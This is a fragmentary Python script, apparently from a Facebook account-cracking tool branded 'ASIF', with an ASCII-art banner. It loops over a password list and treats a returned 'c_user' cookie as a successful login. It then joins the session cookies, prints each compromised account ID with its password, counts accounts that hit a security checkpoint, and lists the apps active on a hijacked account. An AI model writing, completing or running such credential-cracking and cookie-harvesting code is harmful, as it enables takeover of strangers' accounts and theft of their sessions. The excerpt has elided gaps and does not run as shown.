...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r[ASIF] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[ASIF] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
...
logo = ("""
 ...
 .d8b.  .d8888. d888888b d88888b 
d8' `8b 88'  YP   `88'   88'     
88ooo88 `8bo.      88    88ooo   
88~~~88   `Y8b.    88    88~~~   
88   88 db   8D   .88.   88      
YP   YP `8888Y' Y888888P YP  
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Tools    : ASIF SAKHANI           ┃
┃ Owner    : ASIF              ┃
┃ Facebook : MR DEVIL  ┃
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('   \033[1;32m(ASIF-OK 💚)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r %s[ASIF] [%s/%s]  CP:- %s  OK:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
